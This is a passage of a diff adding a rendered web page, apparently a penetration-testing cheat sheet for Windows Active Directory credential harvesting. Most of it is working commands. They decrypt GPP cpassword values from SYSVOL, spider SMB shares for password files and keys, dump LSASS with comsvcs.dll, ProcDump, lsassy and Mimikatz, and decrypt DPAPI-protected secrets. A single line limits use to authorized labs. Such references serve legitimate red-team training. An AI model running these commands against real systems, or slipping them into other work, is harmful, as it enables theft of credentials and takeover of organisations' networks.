+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>DataSources.xml
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>Drives.xml
+</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>Printers.xml
+</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a>Registry.xml
+</span></code></pre></div>
+<p><strong>Search for cpassword</strong></p>
+<p>Mounted SYSVOL:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>grep<span class="w"> </span>-Rni<span class="w"> </span><span class="s2">&quot;cpassword&quot;</span><span class="w"> </span>/mnt/sysvol
+</span></code></pre></div>
+<p>SMB share spider with NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>gpp_password
+</span></code></pre></div>
+<p>Older tool:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>gpp-decrypt<span class="w"> </span><span class="s1">&#39;CPasswordValueHere&#39;</span>
+</span></code></pre></div>
+<p>Manual find:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>find<span class="w"> </span>/mnt/sysvol<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.xml&quot;</span><span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-Hni<span class="w"> </span><span class="s2">&quot;cpassword&quot;</span><span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span>
+</span></code></pre></div>
+<p><strong>Example XML pattern</strong></p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="nt">&lt;User</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;Administrator&quot;</span><span class="w"> </span><span class="na">cpassword=</span><span class="s">&quot;...&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span></code></pre></div>
+<p>Useful XML fields:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cpassword</code></td>
+<td>Encrypted GPP password value.</td>
+</tr>
+<tr>
+<td><code>userName</code> / <code>name</code></td>
+<td>Target account name.</td>
+</tr>
+<tr>
+<td><code>changed</code></td>
+<td>Timestamp in XML.</td>
+</tr>
+<tr>
+<td><code>description</code></td>
+<td>Sometimes shows purpose.</td>
+</tr>
+<tr>
+<td><code>runAs</code></td>
+<td>Execution context.</td>
+</tr>
+<tr>
+<td><code>newName</code></td>
+<td>Local account rename field.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Decrypt</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>gpp-decrypt<span class="w"> </span><span class="s1">&#39;CPasswordValueHere&#39;</span>
+</span></code></pre></div>
+<p><strong>Search and decrypt workflow</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>grep<span class="w"> </span>-Rni<span class="w"> </span><span class="s2">&quot;cpassword&quot;</span><span class="w"> </span>/mnt/sysvol<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>gpp_cpassword_hits.txt
+</span></code></pre></div>
+<p>Extract values manually and decrypt:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>gpp-decrypt<span class="w"> </span><span class="s1">&#39;VALUE&#39;</span>
+</span></code></pre></div>
+<p><strong>Common result</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>Account: local Administrator or domain account
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>Password: plaintext recovered from cpassword
+</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a>Source: SYSVOL GPP XML
+</span></code></pre></div>
+<hr />
+<h2 id="shares-secrets">Shares Secrets</h2>
+<p>Share secrets are credentials or useful authentication material found in SMB shares.</p>
+<p>After getting a valid domain user, share access often expands significantly.</p>
+<p><strong>Enumerate shares</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares
+</span></code></pre></div>
+<p>Readable shares:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares<span class="w"> </span>READ
+</span></code></pre></div>
+<p>Writable shares:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares<span class="w"> </span>WRITE
+</span></code></pre></div>
+<p>Spider share:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--spider<span class="w"> </span>SHARENAME
+</span></code></pre></div>
+<p>Spider for password patterns:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--spider<span class="w"> </span>SHARENAME<span class="w"> </span>--pattern<span class="w"> </span>password
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--spider<span class="w"> </span>SHARENAME<span class="w"> </span>--pattern<span class="w"> </span>cred
+</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--spider<span class="w"> </span>SHARENAME<span class="w"> </span>--pattern<span class="w"> </span>backup
+</span></code></pre></div>
+<p><strong>smbmap</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-R
+</span></code></pre></div>
+<p>Download file:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>--download<span class="w"> </span><span class="s1">&#39;SHARE\\path\\file.txt&#39;</span>
+</span></code></pre></div>
+<p><strong>smbclient</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/SHARENAME<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<p>Recursive download in labs:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/SHARENAME<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; prompt OFF; mget *&#39;</span>
+</span></code></pre></div>
+<p><strong>Interesting shares</strong></p>
+<table>
+<thead>
+<tr>
+<th>Share</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>IT</code></td>
+<td>Scripts, deployment files, admin notes.</td>
+</tr>
+<tr>
+<td><code>Backups</code></td>
+<td>Archives, config exports, database dumps.</td>
+</tr>
+<tr>
+<td><code>Software</code></td>
+<td>Installers, deployment scripts.</td>
+</tr>
+<tr>
+<td><code>Dev</code></td>
+<td>Source code, config files, <code>.env</code>.</td>
+</tr>
+<tr>
+<td><code>Web</code></td>
+<td>Web app configs.</td>
+</tr>
+<tr>
+<td><code>DBA</code></td>
+<td>Database scripts and credentials.</td>
+</tr>
+<tr>
+<td><code>Home</code> / <code>Users</code></td>
+<td>User files and vaults.</td>
+</tr>
+<tr>
+<td><code>Projects</code></td>
+<td>App docs and integration configs.</td>
+</tr>
+<tr>
+<td><code>Scans</code></td>
+<td>Sometimes contains documents with names or secrets.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Interesting files</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>passwords.txt
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>creds.txt
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>accounts.csv
+</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a>users.xlsx
+</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a>web.config
+</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6" href="#__codelineno-90-6"></a>appsettings.json
+</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7" href="#__codelineno-90-7"></a>.env
+</span><span id="__span-90-8"><a id="__codelineno-90-8" name="__codelineno-90-8" href="#__codelineno-90-8"></a>database.ini
+</span><span id="__span-90-9"><a id="__codelineno-90-9" name="__codelineno-90-9" href="#__codelineno-90-9"></a>db.conf
+</span><span id="__span-90-10"><a id="__codelineno-90-10" name="__codelineno-90-10" href="#__codelineno-90-10"></a>settings.xml
+</span><span id="__span-90-11"><a id="__codelineno-90-11" name="__codelineno-90-11" href="#__codelineno-90-11"></a>backup.zip
+</span><span id="__span-90-12"><a id="__codelineno-90-12" name="__codelineno-90-12" href="#__codelineno-90-12"></a>backup.7z
+</span><span id="__span-90-13"><a id="__codelineno-90-13" name="__codelineno-90-13" href="#__codelineno-90-13"></a>dump.sql
+</span><span id="__span-90-14"><a id="__codelineno-90-14" name="__codelineno-90-14" href="#__codelineno-90-14"></a>*.kdbx
+</span><span id="__span-90-15"><a id="__codelineno-90-15" name="__codelineno-90-15" href="#__codelineno-90-15"></a>*.rdp
+</span><span id="__span-90-16"><a id="__codelineno-90-16" name="__codelineno-90-16" href="#__codelineno-90-16"></a>*.ppk
+</span><span id="__span-90-17"><a id="__codelineno-90-17" name="__codelineno-90-17" href="#__codelineno-90-17"></a>*.pem
+</span><span id="__span-90-18"><a id="__codelineno-90-18" name="__codelineno-90-18" href="#__codelineno-90-18"></a>id_rsa
+</span></code></pre></div>
+<p><strong>Search downloaded share</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>grep<span class="w"> </span>-RniE<span class="w"> </span><span class="s2">&quot;password|passwd|pwd|cred|secret|token|api|key|login|connectionstring|user id|uid&quot;</span><span class="w"> </span>.
+</span></code></pre></div>
+<p>Search file names:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>find<span class="w"> </span>.<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*pass*&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*cred*&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*secret*&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*backup*&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.kdbx&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.config&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.sql&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="lsass-dumping">LSASS Dumping</h2>
+<p>LSASS is the Local Security Authority Subsystem Service.</p>
+<p>It handles Windows authentication and may contain credential material for users who logged on to the machine.</p>
+<p>LSASS dumping generally requires local administrator or equivalent privileges on the target host.</p>
+<p>Do this only in authorized labs or explicitly scoped assessments.</p>
+<p>Possible material in or related to LSASS:</p>
+<table>
+<thead>
+<tr>
+<th>Material</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NT hashes</td>
+<td>Depends on logon type and protections.</td>
+</tr>
+<tr>
+<td>Kerberos tickets</td>
+<td>TGTs and service tickets.</td>
+</tr>
+<tr>
+<td>Plaintext credentials</td>
+<td>Less common on modern systems, but possible in some conditions.</td>
+</tr>
+<tr>
+<td>DPAPI keys</td>
+<td>Useful for decrypting user secrets.</td>
+</tr>
+<tr>
+<td>Logon sessions</td>
+<td>User and authentication context.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Check local admin</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p><code>Pwn3d!</code> or similar output usually indicates administrative access for that protocol.</p>
+<p><strong>Dump with NetExec</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--sam
+</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--lsa
+</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>lsassy
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--sam
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--lsa
+</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>lsassy
+</span></code></pre></div>
+<p><strong>Dump with lsassy</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>lsassy<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>lsassy<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span><span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p><strong>Dump LSASS with comsvcs.dll on a Windows host</strong></p>
+<p>Find LSASS PID:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>tasklist /fi &quot;imagename eq lsass.exe&quot;
+</span></code></pre></div>
+<p>Dump:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; C:\Windows\Temp\lsass.dmp full
+</span></code></pre></div>
+<p><strong>Dump with ProcDump</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+</span></code></pre></div>
+<p><strong>Parse dump with pypykatz</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>pypykatz<span class="w"> </span>lsa<span class="w"> </span>minidump<span class="w"> </span>lsass.dmp
+</span></code></pre></div>
+<p>Save output:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>pypykatz<span class="w"> </span>lsa<span class="w"> </span>minidump<span class="w"> </span>lsass.dmp<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>pypykatz_lsass.txt
+</span></code></pre></div>
+<p><strong>Parse with Mimikatz</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>mimikatz.exe
+</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a>privilege::debug
+</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a>sekurlsa::minidump C:\Windows\Temp\lsass.dmp
+</span><span id="__span-103-4"><a id="__codelineno-103-4" name="__codelineno-103-4" href="#__codelineno-103-4"></a>sekurlsa::logonpasswords
+</span><span id="__span-103-5"><a id="__codelineno-103-5" name="__codelineno-103-5" href="#__codelineno-103-5"></a>sekurlsa::tickets
+</span></code></pre></div>
+<p><strong>Live Mimikatz on authorized lab host</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>mimikatz.exe
+</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a>privilege::debug
+</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a>sekurlsa::logonpasswords
+</span><span id="__span-104-4"><a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a>sekurlsa::tickets
+</span></code></pre></div>
+<p><strong>Useful outputs</strong></p>
+<table>
+<thead>
+<tr>
+<th>Output</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>msv</code></td>
+<td>NTLM-related credential material.</td>
+</tr>
+<tr>
+<td><code>wdigest</code></td>
+<td>Plaintext possible only in specific conditions.</td>
+</tr>
+<tr>
+<td><code>kerberos</code></td>
+<td>Kerberos tickets and keys.</td>
+</tr>
+<tr>
+<td><code>tspkg</code></td>
+<td>Older credential provider context.</td>
+</tr>
+<tr>
+<td><code>credman</code></td>
+<td>Credential Manager entries.</td>
+</tr>
+<tr>
+<td><code>dpapi</code></td>
+<td>DPAPI masterkey-related material.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="dpapi">DPAPI</h2>
+<p>DPAPI is the Windows Data Protection API.</p>
+<p>It protects many user and machine secrets, including saved browser credentials, Windows Credential Manager entries, Wi-Fi secrets, RDP credentials, and application secrets.</p>
+<p>DPAPI data is usually encrypted with masterkeys tied to the user, machine, password, domain backup keys, or current logon context.</p>
+<p>Useful DPAPI locations:</p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>%APPDATA%\Microsoft\Protect\&lt;SID&gt;\</code></td>
+<td>User masterkeys.</td>
+</tr>
+<tr>
+<td><code>%LOCALAPPDATA%\Microsoft\Credentials\</code></td>
+<td>User credentials.</td>
+</tr>
+<tr>
+<td><code>%APPDATA%\Microsoft\Credentials\</code></td>
+<td>Roaming credentials.</td>
+</tr>
+<tr>
+<td><code>%LOCALAPPDATA%\Microsoft\Vault\</code></td>
+<td>Vault data.</td>
+</tr>
+<tr>
+<td><code>%APPDATA%\Microsoft\Vault\</code></td>
+<td>Roaming vault data.</td>
+</tr>
+<tr>
+<td>Chrome/Edge profile</td>
+<td>Browser secrets protected with DPAPI.</td>
+</tr>
+<tr>
+<td>RDP / RDCMan files</td>
+<td>Remote access secrets.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Windows paths</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\
+</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a>C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\
+</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Credentials\
+</span><span id="__span-105-4"><a id="__codelineno-105-4" name="__codelineno-105-4" href="#__codelineno-105-4"></a>C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Vault\
+</span><span id="__span-105-5"><a id="__codelineno-105-5" name="__codelineno-105-5" href="#__codelineno-105-5"></a>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Vault\
+</span></code></pre></div>
+<p><strong>Mimikatz DPAPI triage</strong></p>
+<p>Live context:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>mimikatz.exe
+</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a>privilege::debug
+</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a>sekurlsa::dpapi
+</span><span id="__span-106-4"><a id="__codelineno-106-4" name="__codelineno-106-4" href="#__codelineno-106-4"></a>sekurlsa::logonpasswords
+</span></code></pre></div>
+<p>List masterkeys:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>dpapi::masterkey /in:C:\Users\alice\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt;
+</span></code></pre></div>
+<p>Decrypt credential file with known masterkey:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>dpapi::cred /in:C:\Users\alice\AppData\Local\Microsoft\Credentials\&lt;FILE&gt; /masterkey:&lt;MASTERKEY&gt;
+</span></code></pre></div>
+<p><strong>SharpDPAPI</strong></p>
+<p>Triage current user context:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>SharpDPAPI.exe triage
+</span></code></pre></div>
+<p>Credential Manager:</p>
